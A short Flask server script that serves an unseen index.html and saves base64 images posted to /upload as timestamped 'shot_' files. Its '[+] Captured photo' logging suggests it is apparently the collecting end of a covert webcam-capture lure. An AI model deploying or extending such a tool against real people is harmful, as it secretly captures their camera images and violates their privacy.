#!/usr/bin/env python3
from flask import Flask, request, send_file
import os
import base64
from datetime import datetime

app = Flask(__name__)
UPLOAD_DIR = "shots"
os.makedirs(UPLOAD_DIR, exist_ok=True)

@app.route('/')
def index():
    return send_file('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    if not data or 'image' not in data:
        return "No image data", 400
    img_b64 = data['image']
    img_data = base64.b64decode(img_b64)
    filename = f"shot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
    path = os.path.join(UPLOAD_DIR, filename)
    with open(path, 'wb') as f:
        f.write(img_data)
    print(f"[+] Captured photo saved: {path}")
    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
